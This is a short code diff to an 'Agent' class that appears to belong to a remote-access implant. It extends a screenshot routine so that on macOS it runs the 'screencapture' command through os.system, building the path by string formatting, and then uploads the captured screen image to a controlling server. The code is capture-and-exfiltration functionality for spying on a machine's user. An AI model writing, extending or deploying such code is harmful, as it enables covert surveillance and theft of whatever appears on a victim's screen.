@@ -274,11 +274,17 @@ class Agent(object):
     @threaded
     def screenshot(self):
         """ Takes a screenshot and uploads it to the server"""
-        screenshot = ImageGrab.grab()
         tmp_file = tempfile.NamedTemporaryFile()
         screenshot_file = tmp_file.name + ".png"
-        tmp_file.close()
-        screenshot.save(screenshot_file)
+
+        if os.name != 'posix':
+            screenshot = ImageGrab.grab()
+            tmp_file.close()
+            screenshot.save(screenshot_file)
+        else:
+            name = tmp_file.name + ".png"
+            os.system("screencapture %s" % name)
+            print(name)
         self.upload(screenshot_file)
 
     def help(self):
